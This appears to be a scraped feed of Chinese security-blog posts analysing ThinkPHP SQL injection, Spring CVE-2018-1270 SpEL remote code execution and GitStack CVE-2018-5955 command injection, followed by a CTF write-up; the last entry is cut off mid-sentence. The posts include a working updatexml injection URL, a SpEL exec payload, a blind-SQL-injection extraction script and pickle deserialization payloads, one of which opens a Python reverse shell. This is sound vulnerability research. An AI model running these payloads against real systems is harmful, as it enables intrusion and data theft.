      <url>%2F2018%2F04%2F10%2FThinkphp%E6%A1%86%E6%9E%B6-5-0-16-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Thinkphp框架 &lt; 5.0.16 sql注入漏洞分析 前言 漏洞复现搭建好数据库，以我自己的配置为例。数据库为tptest，表名为user，其中有两个字段id和username thinkphp官网下载5.0.15版本： http://www.thinkphp.cn/down/1125.html 。修改数据库配置信息 application/database.php。在 application/config.php 中打开调试和trace，app_debug和app_trace均为true。在 application/index/controller/Index.php 中Index类中添加方法：12345public function testsql()&#123; $username = input('get.username/a'); db('user')-&gt;where(['id'=&gt; 1])-&gt;insert(['username'=&gt;$username]);&#125; 访问：1http://127.0.0.1/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 漏洞分析通过input获取到参数后，username变量情况如下： 跟入insert，thinkphp/library/think/db/Query.php:2078123456public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)&#123; // 分析查询表达式 $options = $this-&gt;parseExpress(); $data = array_merge($options['data'], $data); ... 接下去执行：1$sql = $this-&gt;builder-&gt;insert($data, $options, $replace); 跟入 thinkphp/library/think/db/Builder.php:720：12345678public function insert(array $data, $options = [], $replace = false) &#123; // 分析并处理数据 $data = $this-&gt;parseData($data, $options); if (empty($data)) &#123; return 0; &#125; ... 跟入parseData至 thinkphp/library/think/db/Builder.php:101 ，相关变量信息已经注释添加。 1234567891011121314151617181920212223242526272829303132protected function parseData($data, $options)&#123; ... // 注 foreach ($data as $key =&gt; $val) &#123; // 第 101 行左右 // $key : "username" // $val : &#123;"inc","updatexml(1,concat(0x7,user(),0x7e),1)","1"&#125; $item = $this-&gt;parseKey($key, $options); if (is_object($val) &amp;&amp; method_exists($val, '__toString')) &#123; .... &#125; if (false === strpos($key, '.') &amp;&amp; !in_array($key, $fields, true)) &#123; ... &#125; elseif (is_null($val)) &#123; ... &#125; elseif (is_array($val) &amp;&amp; !empty($val)) &#123; // $val[0] = "inc" switch ($val[0]) &#123; case 'exp': $result[$item] = $val[1]; break; case 'inc': $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; case 'dec': $result[$item] = $this-&gt;parseKey($val[1]) . '-' . floatval($val[2]); break; &#125; &#125; ... &#125; return $result; 可以看出$val是数组，且根据$val[0]值为inc，会通过switch语句进入到下面这条：12345case 'inc': // $val[1] = "updatexml(1,concat(0x7,user(),0x7e),1)" // $val[2] = "1" $result[$item] = $this-&gt;parseKey($val[1]) . '+' . floatval($val[2]); break; 跟入此处的parseKey，即thinkphp/library/think/db/builder/Mysql.php:90123456789101112131415161718192021222324252627protected function parseKey($key, $options = [])&#123; $key = trim($key); if (strpos($key, '$.') &amp;&amp; false === strpos($key, '(')) &#123; // JSON字段支持 list($field, $name) = explode('$.', $key); $key = 'json_extract(' . $field . ', \'$.' . $name . '\')'; &#125; elseif (strpos($key, '.') &amp;&amp; !preg_match('/[,\'\"\(\)`\s]/', $key)) &#123; list($table, $key) = explode('.', $key, 2); if ('__TABLE__' == $table) &#123; $table = $this-&gt;query-&gt;getTable(); &#125; if (isset($options['alias'][$table])) &#123; $table = $options['alias'][$table]; &#125; &#125; if (!preg_match('/[,\'\"\*\(\)`.\s]/', $key)) &#123; $key = '`' . $key . '`'; &#125; if (isset($table)) &#123; if (strpos($table, '.')) &#123; $table = str_replace('.', '`.`', $table); &#125; $key = '`' . $table . '`.' . $key; &#125; return $key; // $key : "updatexml(1,concat(0x7,user(),0x7e),1)"&#125; 此处并未对传入的$key进行更多的过滤与检查，最后返回的仍然是1 and (updatexml(1,concat(0x7,user(),0x7e),1)) 回到parseData，floatval($val[2])返回1，这也正是我们要传入username[2]=1的原因。将其与前面经过parseKey的结果进行拼接后返回给result 回到 thinkphp/library/think/db/Query.ph 的 insert 中： 漏洞修复官方commit： https://github.com/top-think/framework/commit/363fd4d90312f2cfa427535b7ea01a097ca8db1b在进行dec和inc操作之前对$val[1]的值进行了再次确认。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[spring-messaging Remote Code Execution 分析-【CVE-2018-1270】]]></title>
      <url>%2F2018%2F04%2F07%2Fspring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91%2F</url>
      <content type="text"><![CDATA[spring-messaging Remote Code Execution 分析-【CVE-2018-1270】 漏洞公告https://pivotal.io/security/cve-2018-1270 漏洞影响版本: Spring Framework 5.0 to 5.0.4 Spring Framework 4.3 to 4.3.14 Older unsupported versions are also affected 环境搭建利用官方示例 https://github.com/spring-guides/gs-messaging-stomp-websocket ，git clone后checkout到未更新版本：123git clone https://github.com/spring-guides/gs-messaging-stomp-websocketgit checkout 6958af0b02bf05282673826b73cd7a85e84c12d3 用IDEA打开gs-messaging-stomp-websocket目录下的complete项目，修改app.js中的第15行：123456789101112function connect() &#123; var header = &#123;"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"&#125;; var socket = new SockJS('/gs-guide-websocket'); stompClient = Stomp.over(socket); stompClient.connect(&#123;&#125;, function (frame) &#123; setConnected(true); console.log('Connected: ' + frame); stompClient.subscribe('/topic/greetings', function (greeting) &#123; showGreeting(JSON.parse(greeting.body).content); &#125;,header); &#125;);&#125; 增加了一个header头部，其中指定了selector，其值即payload。 漏洞利用点击connect后建立起连接，在文本框中随意输入，点击Send，触发poc： 漏洞分析当在 http://localhost:8080/ 中点击Connect后，在app.js中，有如下代码，会建立起Websocket连接：12345var header = &#123;"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"&#125;;...stompClient.subscribe('/topic/greetings', function (greeting) &#123; showGreeting(JSON.parse(greeting.body).content);&#125;,header); 其中header中指定了selector，根据 Stomp Protocol Specification, Version 1.0，通过指定对应的selecttor，可以对订阅的信息进行过滤：123Stomp brokers may support the selector header which allows you to specify an SQL 92 selector on the message headers which acts as a filter for content based routing.You can also specify an id header which can then later on be used to UNSUBSCRIBE from the specific subscription as you may end up with overlapping subscriptions using selectors with the same destination. If an id header is supplied then Stomp brokers should append a subscription header to any MESSAGE commands which are sent to the client so that the client knows which subscription the message relates to. If using Wildcards and selectors this can help clients figure out what subscription caused the message to be created. 在 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java 第140行，对这个header参数进行了接受和处理：1234567891011121314151617181920212223protected void addSubscriptionInternal( String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123; Expression expression = null; MessageHeaders headers = message.getHeaders(); String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers); if (selector != null) &#123; try &#123; expression = this.expressionParser.parseExpression(selector); this.selectorHeaderInUse = true; if (logger.isTraceEnabled()) &#123; logger.trace("Subscription selector: [" + selector + "]"); &#125; &#125; catch (Throwable ex) &#123; if (logger.isDebugEnabled()) &#123; logger.debug("Failed to parse selector: " + selector, ex); &#125; &#125; &#125; this.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression); this.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);&#125; 如图所示，此次连接对应的sessionId为mrzfa005，subsId为sub-0。 之后，在 http://localhost:8080/ 中输入任意字符串，点击send。spring进行了一系列处理后，开始向消息的订阅者分发消息，在 org/springframework/messaging/simp/broker/SimpleBrokerMessageHandler.java:349 行：123protected void sendMessageToSubscribers(@Nullable String destination, Message&lt;?&gt; message) &#123; MultiValueMap&lt;String,String&gt; subscriptions = this.subscriptionRegistry.findSubscriptions(message); ... 其中message保存了此次连接/会话的相关信息： 跟入 this.subscriptionRegistry.findSubscriptions 至 org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java:111 行：1234public final MultiValueMap&lt;String, String&gt; findSubscriptions(Message&lt;?&gt; message) &#123; .... return findSubscriptionsInternal(destination, message);&#125; message作为参数被传入 findSubscriptionsInternal ，在return处继续跟进至 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:184行1234protected MultiValueMap&lt;String, String&gt; findSubscriptionsInternal(String destination, Message&lt;?&gt; message) &#123; MultiValueMap&lt;String, String&gt; result = this.destinationCache.getSubscriptions(destination, message); return filterSubscriptions(result, message);&#125; 其中result变量值如下： 该变量即 org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java:201行的filterSubscriptions方法的allMatches变量，跟进至两层for循环12345678910111213for (String sessionId : allMatches.keySet()) &#123; for (String subId : allMatches.get(sessionId)) &#123; SessionSubscriptionInfo info = this.subscriptionRegistry.getSubscriptions(sessionId); if (info == null) &#123; continue; &#125; Subscription sub = info.getSubscription(subId); if (sub == null) &#123; continue; &#125; ... &#125;&#125; 通过两次getSubscriptions操作，此时取出了先前的配置信息，sub变量值如下： 接下去第 207 行将selector表达式取出：1Expression expression = sub.getSelectorExpression(); 第217行：12345try &#123; if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123; result.add(sessionId, subId); &#125;&#125; 通过调用了expression.getValue(context, Boolean.class)，触发payload，执行了spel表达式，远程命令执行成功。 参考 spring-guides/gs-messaging-stomp-websocket spring-framework-reference: websocket-stomp springmvc(18)使用WebSocket 和 STOMP 实现消息功能]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GitStack]]></title>
      <url>%2F2018%2F03%2F30%2FGitStack-2-3-10-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-5955%E3%80%91%2F</url>
      <content type="text"><![CDATA[GitStack &lt;= 2.3.10 远程命令执行漏洞分析-【CVE-2018-5955】 GitStackGitStack是一款win平台下的Git可视化平台。其最新版本2.3.10存在一个远程命令执行漏洞(CVE-2018-5955)，对应下载地址： https://gitstack.com/download/ 。 安装完成后，登陆入口在 http://192.168.248.130/registration/login/?next=/gitstack/ 。默认用户名/密码分别为： admin/admin 漏洞分析一些“小”漏洞views.py中的问题太多了，为后续的命令执行利用，这里仅列一些。目测开发者在开发的时候想这些接口开放着也没关系。。 用户相关rest_user首先在app/rest/views.py中定义了rest_user方法：123456789101112131415161718192021222324252627282930313233343536373839@csrf_exemptdef rest_user(request): try: # create user if request.method == 'POST': username = request.POST['username'] password = request.POST['password'] # get the username/password from the request # check the username matcher = re.compile("^[A-Za-z]\w&#123;2,&#125;$") if matcher.match(username) is None: raise Exception("Please enter an alphanumeric name without spaces") if(username == ""): raise Exception("Please enter a non empty name") user = UserFactory.instantiate_user(username, password) user.create() return HttpResponse("User created") # get retrieve_all the users if request.method == 'GET': # convert list of objects to list of strings user_list_str = [] user_list_obj = UserFactory.instantiate_user('').retrieve_all() for user in user_list_obj: user_list_str.append(user.username) json_reply = json.dumps(user_list_str) return HttpResponse(json_reply) # update the user if request.method == 'PUT': # retrieve the credentials from the json credentials = json.loads(request.raw_post_data) # create an instance of the user and update it user = UserFactory.instantiate_user(credentials['username'], credentials['password']) user.update() return HttpResponse("User successfully updated") except Exception as e: return HttpResponseServerError(e) 在默认情况下： 使用GET方式可以直接查看GitStack仓库的用户列表，存在未授权访问信息泄露漏洞 通过POST方法，指定username和password可以直接添加仓库用户，存在任意用户添加漏洞： 通过PUT方法，以JSON格式即可重置任意用户密码： project相关任意创建repo12345678910111213141516# create a repositorydef rest_repository(request): # Add new repository if request.method == 'POST': name=request.POST['name'] try: # check the repo name matcher = re.compile("^\w&#123;1,&#125;$") if matcher.match(name) is None: raise Exception("Please enter an alphanumeric name without spaces") if(name == ""): raise Exception("Please enter a non empty name") # create the repo repository = Repository(name) repository.create() .... 直接POST一个name即可创建对应的project，不过在POST的时候需要带上CSRF_TOKEN CSRF_TOKEN的获得如下，访问登陆页面，比如 http://192.168.248.130/registration/login/?next=/gitstack/ ，查看源代码： 任意repo添加user123456789101112131415@csrf_exemptdef rest_repo_user(request, repo_name, username): repo = Repository(repo_name) user = UserFactory.instantiate_user(username) # Add user if request.method == 'POST': try: # Get the repository and add the user repo.add_user(user) repo.add_user_read(user) repo.add_user_write(user) repo.save() return HttpResponse("User " + username + " added to " + repo_name) ... 按照下面这个格式即可添加：1POST http://xx/rest/repository/项目名/user/用户名/ 远程命令执行漏洞默认情况下GitStack的Web Interface接口时开启的。访问http://xx/web/index.php也即访问gitphp目录下的index.php. 第 153 行进行了认证操作：12345678&lt;?php /* * Authentification */ $auth = new GitPHP_Authentication(); $auth-&gt;authenticate(); ... ?&gt; GitPHP_Authentication定义在gitphp/include/Authentication.class.php中：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class GitPHP_Authentication&#123; .... // Authenticate the user public function authenticate() &#123; // Get the project name if(isset($_GET['p']))&#123; //$this-&gt;project_name = substr($_GET['p'], 0, -1); $this-&gt;project_name = $_GET['p']; // Read the users of the project $users = $this-&gt;readRepositoryReadUsers(); // check if the user everyone is in the list if(in_array('everyone', $users)) &#123; // yes return true; // the user do not need to be authenticated &#125; else &#123; // The user should be authenticated // Ask for username/password if (!isset($_SERVER['PHP_AUTH_USER'])) &#123; header('WWW-Authenticate: Basic realm="Enter a username/password of a user which has the rights to access to this repository. ADMIN PASSWORD WON\'T WORK"'); header('HTTP/1.0 401 Unauthorized'); echo 'xxx省略'; exit; &#125; else &#123; // try to authenticate $authenticated = false; $username = $_SERVER['PHP_AUTH_USER']; $password = $_SERVER['PHP_AUTH_PW']; // Check if the user is in the array of read users if(in_array($username, $users))&#123; $authMethod = $this-&gt;getAuthMethod(); // authenticate with ldap or by file if($authMethod == "file")&#123; $authenticated = $this-&gt;authenticateFile($username, $password); &#125; if($authMethod == "ldap") &#123; $authenticated = $this-&gt;authenticateLdap($username, $password); &#125; if ($authenticated == false)&#123; $this-&gt;denyAuthentication(); &#125; &#125; else &#123; $this-&gt;denyAuthentication(); &#125; &#125; &#125; &#125; &#125; 当访问index.php时指定了参数p，也即project_name，会通过$this-&gt;readRepositoryReadUsers()将该project对应的user提取出来。倘若该project并非公开，即everyone并不在$users中，则进入authenticated阶段。 可以看到，在这部分的认证中，采用了HTTP Basic Authentication的方式 根据php手册,当PHP以Apache模块方式运行时可以用 header()函数来向客户端浏览器发送认证请求信息。而当用户输入用户名和密码后，包含有URL的PHP脚本将会把变量PHP_AUTH_USER,PHP_AUTH_PW和AUTH_TYPE分别被设定为用户名，密码和认证类型。也就是说，这里的username与password即我们可控，且未加以过滤的变量：12$username = $_SERVER['PHP_AUTH_USER'];$password = $_SERVER['PHP_AUTH_PW']; 在确认输入的用户名($username)在project的用户列表后，开始进行真正的认证操作。首先是获取认证类型$authMethod = $this-&gt;getAuthMethod();：12345678910 private function getAuthMethod()&#123; // Read the gitstack settings file $settingsDir = GitPHP_Config::GetInstance()-&gt;GetValue('gitstacksettings', ''); // read the ini file $ini_array = parse_ini_file($settingsDir, true, INI_SCANNER_RAW); $authMethod = $ini_array['authentication']['authmethod']; // should contain "ldap" or "file" return $authMethod;&#125; gitstacksettings的默认值在data/settings.ini中设定，其中：123[authentication]authmethod = fileldapprotocol = 也即在默认情况下采用的是file方式的认证方法，程序流程进入：12345678910111213141516171819202122232425262728293031323334 if($authMethod == "file")&#123; $authenticated = $this-&gt;authenticateFile($username, $password); &#125; ``` `authenticateFile`定义在`gitphp/include/Authentication.class.php`第182行：```php private function authenticateFile($username, $password)&#123; $authenticated = false; // Will contains username as key, salt and encrypted pass as value $userInfos = Array(); // exec the open ssl command $installDir = GitPHP_Config::GetInstance()-&gt;GetValue('gitstackinstalldir', ''); $lines = file($installDir . "/data/passwdfile"); // Fill the userInfos array foreach($lines as $line) &#123; 。。。省略 &#125; // if the user exist in the array if(array_key_exists($username, $userInfos))&#123; // run the openssl command to verify the password $currentUser = $userInfos[$username]; $result = exec($installDir . '/apache/bin/openssl.exe passwd -apr1 -salt ' . $currentUser['salt'] . " " . $password); // result = $apr1$v1Ds2Lf9$hNL6r81eGFXrUmh5wbQpn0 // split the result to get only the encrypted password part $split = explode('$', $result); $encryptedPassword = $split[3]; if($encryptedPassword == $currentUser['encryptedPass']) $authenticated = true; &#125; return $authenticated; &#125; 此处的流程就是将project的用户信息从/data/passwdfile读出，经过一定的处理，然后通过openssl来进行响应的验证。注意这里的代码：1$result = exec($installDir . '/apache/bin/openssl.exe passwd -apr1 -salt ' . $currentUser['salt'] . " " . $password); 我们传入的$password直接拼接到了语句中，然后exec执行，这里即存在命令执行漏洞，且由于并不需要认证成功。 Exploit不过这里的任意命令执行漏洞有一些限制，它需要在进行HTTP Basic Authentication时在用户名处填入project的用户列表中的某一个，然后通过在密码处注入payload，才能到达exec处。因此结合前面第一部分的未授权访问/任意添加用户等等漏洞，可以梳理如下两种方法： 通过GET /rest/user获取到所有的用户列表，然后直接进行爆破，总有某些用户是属于选择的project的用户列表中的。脚本如下： 通过POST /rest/user添加用户x，接着创建repo，将用户x加入到repo中，然后基于用户x的认证来进行rce。第二种方法的脚本见 https://blogs.securiteam.com/index.php/archives/3557 ，不搬运了。 Refference SSD Advisory – GitStack Unauthenticated Remote Code Execution]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python is the best language-writeup]]></title>
      <url>%2F2018%2F03%2F25%2FPython-is-the-best-language-writeup%2F</url>
      <content type="text"><![CDATA[强网杯：Python is the best language-writeup 题目Python is the best language 1/212345678http://39.107.32.29:20000http://117.50.16.51:20000下载地址备用下载地址（密码：rtou）I&apos;m learning the flask recently,and I think python is the best language in the world!don&apos;t you think so? Python is the best language 1源码下载下来后，由于是基于flask框架，因此先看了看路由文件routes.py，大概如下：123456789101112131415161718192021222324252627282930313233343536@app.before_requestdef before_request():@app.teardown_requestdef shutdown_session(exception=None):@app.route('/', methods=['GET', 'POST'])@app.route('/index', methods=['GET', 'POST'])@login_requireddef index():@app.route('/explore')@login_requireddef explore():@app.route('/logout')def logout():@app.route('/register', methods=['GET', 'POST'])def register():@app.route('/user/&lt;username&gt;')@login_requireddef user(username):@app.route('/edit_profile', methods=['GET', 'POST'])@login_requireddef edit_profile():@app.route('/follow/&lt;username&gt;')@login_requireddef follow(username):@app.route('/unfollow/&lt;username&gt;')@login_requireddef unfollow(username): 这些功能大部分是基于登陆的，因此从注册和登陆相关的代码入手。123456789101112@app.route('/register', methods=['GET', 'POST'])def register(): if current_user.is_authenticated: return redirect(url_for('index')) form = RegistrationForm() if form.validate_on_submit(): res = mysql.Add("user", ["NULL", "'%s'" % form.username.data, "'%s'" % form.email.data, "'%s'" % generate_password_hash(form.password.data), "''", "'%s'" % now()]) if res == 1: flash('Congratulations, you are now a registered user!') return redirect(url_for('login')) return render_template('register.html', title='Register', form=form) 跟进RegistrationForm，定义在 forms.py的第20行:12345678910111213141516171819class RegistrationForm(FlaskForm): username = StringField('Username', validators=[DataRequired()]) email = StringField('Email', validators=[DataRequired(), Email()]) password = PasswordField('Password', validators=[DataRequired()]) password2 = PasswordField( 'Repeat Password', validators=[DataRequired(), EqualTo('password')]) submit = SubmitField('Register') def validate_username(self, username): if re.match("^[a-zA-Z0-9_]+$", username.data) == None: raise ValidationError('username has invalid charactor!') user = mysql.One("user", &#123;"username": "'%s'" % username.data&#125;, ["id"]) if user != 0: raise ValidationError('Please use a different username.') def validate_email(self, email): user = mysql.One("user", &#123;"email": "'%s'" % email.data&#125;, ["id"]) if user != 0: raise ValidationError('Please use a different email address.') 在这里可以很明显的看到两个验证函数有差别，validate_username在进行mysql.One前进行了正则匹配的过滤和审核，而validate_email仅仅通过validators=[DataRequired(), Email()]来匹配。 Email定义在wtforms.validators中，相关源码如下：1234567891011121314151617181920class Email(Regexp): """ Validates an email address. Note that this uses a very primitive regular expression and should only be used in instances where you later verify by other means, such as email activation or lookups. :param message: Error message to raise in case of a validation error. """ def __init__(self, message=None): self.validate_hostname = HostnameValidation( require_tld=True, ) super(Email, self).__init__(r'^.+@([^.@][^@]+)$', re.IGNORECASE, message) def __call__(self, form, field): message = self.message if message is None: message = field.gettext('Invalid email address.') match = super(Email, self).__call__(form, field, message) if not self.validate_hostname(match.group(1)): raise ValidationError(message) 其正则规则为^.+@([^.@][^@]+)$，也就是说对email而言，即使提交如&#39;&quot;#a@q.com包含单引号，双引号，注释符等敏感字符的形式也是能通过的。 回到validate_email验证函数中：1234def validate_email(self, email): user = mysql.One("user", &#123;"email": "'%s'" % email.data&#125;, ["id"]) if user != 0: raise ValidationError('Please use a different email address.') 跟入mysql.One，定义在others.py:1234567891011121314151617181920212223242526# mysql.One("user", &#123;"email": "'%s'" % email.data&#125;, ["id"])def One(self, tablename, where=&#123;&#125;, feildname=["*"], order="", where_symbols="=", l="and"): # self.Sel("user", &#123;"email": "'%s'" % email.data&#125;, ["id"], "", "=", l) sql = self.Sel(tablename, where, feildname, order, where_symbols, l) try: res = self.db_session.execute(sql).fetchone() if res == None: return 0 return res except: return -1``` 跟入`self.Sel`:```python# self.Sel("user", &#123;"email": "'%s'" % email.data&#125;, ["id"], "", "=", l)def Sel(self, tablename, where=&#123;&#125;, feildname=["*"], order="", where_symbols="=", l="and"): sql = "select " sql += "".join(i + "," for i in feildname)[:-1] + " " sql += "from " + tablename + " " if where != &#123;&#125;: sql += "where " + "".join(i + " " + where_symbols + " " + str(where[i]) + " " + l + " " for i in where)[:-4] if order != "": sql += "order by " + "".join(i + "," for i in order)[:-1] return sql 最后拼接出来的sql语句如下：1select id from user where email = 'your input email' 结合前面所说的对输入邮箱email形式的验证，这里存在sql注入漏洞。我们设置邮箱为test&#39;/**/or/**/1=1#@test.com，则拼接后的sql语句为：1select id from user where email = 'test'/**/or/**/1=1#@test.com' 可以看到成功注入。由于此处不能回显数据，因此采用盲注。回到validate_username123456def validate_username(self, username): if re.match("^[a-zA-Z0-9_]+$", username.data) == None: raise ValidationError('username has invalid charactor!') user = mysql.One("user", &#123;"username": "'%s'" % username.data&#125;, ["id"]) if user != 0: raise ValidationError('Please use a different username.') 当查询为真时也即user != 0会出现信息Please use a different username.，结合这点构造出最后的exp.py：12345678910111213141516171819202122232425262728293031323334353637import requestsfrom bs4 import BeautifulSoupurl = "http://39.107.32.29:20000/register"r = requests.get(url)soup = BeautifulSoup(r.text,"html5lib")token = soup.find_all(id='csrf_token')[0].get("value")notice = "Please use a different email address."result = ""database = "(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"tables = "(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"columns = "(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"data = "(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"for i in range(1,100): for j in range(32,127): payload = "test'/**/or/**/ascii(substr("+ data +",%d,1))=%d#/**/@chybeta.com" % (i,j) print payload post_data = &#123; 'csrf_token': token, 'username': 'a', 'email':payload, 'password':'a', 'password2':'a', 'submit':'Register' &#125; r = requests.post(url,data=post_data) soup = BeautifulSoup(r.text,"html5lib") token = soup.find_all(id='csrf_token')[0].get("value") if notice in r.text: result += chr(j) print result break 由于在注册部分有csrf_token，因此在每次submit时要记得带上，同时在每次返回的页面中取得下一次的csrf_token。 最后的flag：1QWB&#123;us1ng_val1dator_caut1ous&#125; Python is the best language 2分析接着进行代码审计。在others.py的最后有这样的内容：12345678910111213141516171819202122232425262728black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads]class FilterException(Exception): def __init__(self, value): super(FilterException, self).__init__( 'the callable object &#123;value&#125; is not allowed'.format(value=str(value)))def _hook_call(func): def wrapper(*args, **kwargs): print args[0].stack if args[0].stack[-2] in black_type_list: raise FilterException(args[0].stack[-2]) return func(*args, **kwargs) return wrapperdef load(file): unpkler = Unpkler(file) unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE]) return Unpkler(file).load() 我把这部分内容分为两部分；反序列化漏洞以及基本的沙箱逃逸问题。 先忽略unpkler.dispatch[REDUCE]这一行的内容。 12345from pickle import Unpickler as Unpklerdef load(file): unpkler = Unpkler(file) # unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE]) return Unpkler(file).load() 这里对file进行了反序列化，因此如果file可控即可造成危险。 用下面的脚本(exp4.py)进行序列化payload的生成：1234567891011121314import osfrom pickle import Pickler as Pklerimport commandsclass chybeta(object): def __reduce__(self): return (os.system,("whoami",)) evil = chybeta()def dump(file): pkler = Pkler(file) pkler.dump(evil)with open("test","wb") as f: dump(f) 测试反序列化漏洞(exp5.py):12345678from pickle import Unpickler as Unpklerfrom io import open as Open def LOAD(file): unpkler = Unpkler(file) return Unpkler(file).load()with Open("test","rb") as f: LOAD(f) 不过没那么简单，源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了，我们修改exp5.py为进一步的测试：12345678910111213141516171819202122232425262728293031323334from os import *from sys import *from pickle import *from io import open as Open from pickle import Unpickler as Unpklerfrom pickle import Pickler as Pklerblack_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen, tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link, lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs, rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv, execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe, spawnv, spawnve, spawnvp, spawnvpe, load, loads]class FilterException(Exception): def __init__(self, value): super(FilterException, self).__init__( 'the callable object &#123;value&#125; is not allowed'.format(value=str(value)))def _hook_call(func): def wrapper(*args, **kwargs): print args[0].stack if args[0].stack[-2] in black_type_list: raise FilterException(args[0].stack[-2]) return func(*args, **kwargs) return wrapperdef LOAD(file): unpkler = Unpkler(file) unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE]) return Unpkler(file).load()with Open("test","rb") as f: LOAD(f) 此时如果简单地想通过前一步生成的test来执行系统命令，会报错。 考虑其他方法。python中除了os和sys模块有提供命令执行的函数外，还有其他第三方模块，比如commands模块： 因此改写生成序列化文件的exp4.py如下：123456789101112131415import osfrom pickle import Unpickler as Unpklerfrom pickle import Pickler as Pklerimport commandsclass chybeta(object): def __reduce__(self): return (commands.getoutput,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",)) evil = chybeta()def dump(file): pkler = Pkler(file) pkler.dump(evil)with open("test","wb") as f: dump(f) 同时为了进一步利用，我们尝试反弹shell。过程如下，先运行exp4.py生成新的test序列化文件，接着nc监听本地端口，接着运行exp5.py触发序列化漏洞并完成利用 不过该怎么控制源代码中的load(file)的file呢？通过全局搜索关键字，在Mycache.py的FileSystemCache类中有多次引用，比如定义在第137行的get方法：123456789101112131415161718192021 def get(self, key): filename = self._get_filename(key) try: with open(filename, 'rb') as f: pickle_time = load(f) if pickle_time == 0 or pickle_time &gt;= time(): a = load(f) return a else: os.remove(filename) return None except (IOError, OSError, PickleError): return None``` 跟入`_get_filename`方法：```pythondef _get_filename(self, key): if isinstance(key, text_type): key = key.encode('utf-8') # XXX unicode review hash = md5(key).hexdigest() return os.path.join(self._path, hash) 可以看到将传入的字符串key进行MD5，并将其返回。不过这个key在哪里定义？通过全局搜索，不难发现在Mysession.py的open_session中进行了调用：123456789101112131415161718192021222324class FileSystemSessionInterface(SessionInterface): ... def __init__(self, cache_dir, threshold, mode, key_prefix="bdwsessions", use_signer=False, permanent=True): self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode) self.key_prefix = key_prefix self.use_signer = use_signer self.permanent = permanent def open_session(self, app, request): # 从cookie中获取到sid # 格式 Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604 # sid 即为 675b6ec7-95bd-411f-a59d-4c3db5929604 sid = request.cookies.get(app.session_cookie_name) if not sid: sid = self._generate_sid() return self.session_class(sid=sid, permanent=self.permanent) ... data = self.cache.get(self.key_prefix + sid) if data is not None: return self.session_class(data, sid=sid) return self.session_class(sid=sid, permanent=self.permanent) ... 其中self.key_prefix即为bdwsessions，因此假设cookie中的sesssion值为675b6ec7-95bd-411f-a59d-4c3dbchybeta，则self.key_prefix + sid即为bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta，然后这串字符串进行MD5得到的结果78f634977cbacf167dfd9656fe9dd5f3即为675b6ec7-95bd-411f-a59d-4c3dbchybeta对应的session文件名。 同时根据config.py:12SQLALCHEMY_DATABASE_URI = "mysql://root:password@localhost/flask?charset=utf8"SESSION_FILE_DIR = "/tmp/ffff" 可以知道session文件的保存路径在/tmp/ffff，以及用户为root，因此具有文件导出的权限的可能性很大。 流程结合Python is the best language 1中的sql注入漏洞，我们梳理出如下的攻击流程： 本地生成序列化文件，并且进行十六进制编码 通过sql注入漏洞outfile出session文件 